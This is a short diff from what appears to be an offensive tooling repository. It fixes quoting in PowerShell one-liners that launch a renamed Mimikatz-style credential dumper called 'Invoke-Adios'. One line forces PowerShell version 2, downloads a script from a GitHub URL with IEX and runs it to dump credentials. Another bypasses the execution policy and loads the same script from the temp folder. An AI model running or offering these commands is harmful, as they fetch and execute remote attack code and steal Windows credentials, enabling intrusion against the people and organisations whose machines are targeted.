@@ -15,7 +15,7 @@ msvc 180021005 1
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-powershell -version 2 "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1');Invoke-Adios -AdiosCreds
+powershell -version 2 "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1');Invoke-Adios -AdiosCreds"
 
 powershell -version 2 -Command Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -force;Import-Module %temp%\Invoke-Adios.ps1;Invoke-Adios -AdiosCreds
 
